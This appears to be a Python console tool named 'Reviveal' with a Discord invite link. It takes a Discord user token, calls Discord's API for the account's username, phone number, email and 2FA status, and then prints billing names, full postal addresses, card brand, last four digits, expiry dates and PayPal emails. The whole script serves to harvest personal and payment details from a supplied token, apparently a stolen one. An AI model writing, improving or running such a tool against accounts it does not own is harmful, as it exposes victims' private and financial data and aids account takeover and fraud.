import threading
import requests
import json
import os
import datetime
import webbrowser

from colored import fg, attr

class color:
   bold = '\033[1m'
   end = '\033[0m'

class colors:
    error = fg('#ff0000')
    warn = fg('#ffda05')
    neutral = fg("#9c9c9c")
    success = fg("#0ea800")
    white = fg("#ffffff")
    lime = fg("#48f542")
    reset = attr('reset')

date = datetime.datetime.now()
curtime = date.strftime("%H:%M:%S")

clear = lambda: os.system('cls')
clear()

def gui():
    print(f"""{colors.lime}

 ██████╗ ███████╗██╗   ██╗██╗██╗   ██╗ █████╗ ██╗     
 ██╔══██╗██╔════╝██║   ██║██║██║   ██║██╔══██╗██║     
 ██████╔╝█████╗  ██║   ██║██║██║   ██║███████║██║     
 ██╔══██╗██╔══╝  ╚██╗ ██╔╝██║╚██╗ ██╔╝██╔══██║██║     
 ██║  ██║███████╗ ╚████╔╝ ██║ ╚████╔╝ ██║  ██║███████╗
 ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝

 {colors.white}Author{colors.lime}:{colors.white} github.com/cood1n
 {colors.lime}
 -----------------------------------------------------

 [{colors.white}1{colors.lime}] {colors.white}View Account Information
 {colors.lime}[{colors.white}2{colors.lime}] {colors.white}Join Discord
 {colors.lime}
 -----------------------------------------------------
""")

def information():
    try:
        token = input(color.bold + f" {colors.white}Please provide a token.{color.end}\n\n {colors.lime}[{colors.white}>{colors.lime}]{colors.white} ").strip('"')
        clear()

        headers = {'Authorization': token, 'Content-Type': 'application/json'}  
        r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers)
        ri = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        info = ri.text
        infodict = json.loads(info)
        bill = r.text
        billdict = json.loads(bill)
        amount = len(billdict)

        print(color.bold + f" {colors.lime}Account Information: \n{colors.white}"  + color.end)
        print(" User:      ", f"{infodict['username'] + '#' + infodict['discriminator'] + ' (' + infodict['id'] + ')'}")
        print(" Phone:     ", infodict['phone'])
        print(" Email:     ", infodict['email'])
        print(" 2FA?:      ", infodict['mfa_enabled'])
        print(" Verified?: ", infodict['verified'])

        print("")
        if amount != 0:
            print(color.bold + f" {colors.lime}Names: \n" + color.end)
            for billing_address in range(0, amount):
                print(f" {billing_address} |", billdict[billing_address]['billing_address']['name'])
            print("")

            print(color.bold + f" {colors.lime}Addresses: \n" + color.end)
            for billing_address in range(0, amount):
                line1 = billdict[billing_address]['billing_address']['line_1']
                line2 = billdict[billing_address]['billing_address']['line_2']
                city = billdict[billing_address]['billing_address']['city']
                state = billdict[billing_address]['billing_address']['state']
                country = billdict[billing_address]['billing_address']['country']
                postalcode = billdict[billing_address]['billing_address']['postal_code']

                print(f" {billing_address} |", f"{line1}," + f'''{line2 + "," if line2 else ""}''', city + ",", state + ",", country + ",", postalcode)

            print("")

            print(color.bold + f" {colors.lime}Payment Methods: \n" + color.end)
            for x in range(0, amount):
                ptype = billdict[x]['type']
                if ptype == 1:
                    brand = billdict[x]['brand']
                    if brand == "mastercard":
                        brand = "MasterCard"
                    if brand == "visa":
                        brand = "Visa"
                    em = billdict[x]['expires_month']
                    ey = billdict[x]['expires_year']
                    l4 = billdict[x]['last_4']
                    country = billdict[x]['country']
                    status = billdict[x]['invalid']
                    if status == True:
                        status = "Invalid"
                    elif status == False:
                        status = "Valid"

                    print(f" {x} |", f"{brand}, ************{l4}, {em}/{ey},", f"Country: {country},", status)
                elif ptype == 2:
                    status = billdict[x]['invalid']
                    if status == True:
                        status = "Invalid"
                    elif status == False:
                        status = "Valid"

                    email = billdict[x]['email']
                    print(f" {x} |","PayPal,", email + ",", status)
                else:
                    print("")
                    input(" Press enter to return.")
                    clear()

        input(" Press enter to return.")
        clear()
        selection()
    except:
        print(f"{color.bold} Invalid token.{color.end}")
        input(" Press enter to return.")
        clear()
        selection()

def selection():
    gui()
    choice = input(f" {colors.lime}[{colors.white}>{colors.lime}] {colors.white}")
    if choice == '1':
        clear()
        information()
    elif choice == '2':
        webbrowser.open('https://discord.gg/JWeJVUphzx')
        clear()
        selection()
    else:
        clear()
        selection()

selection()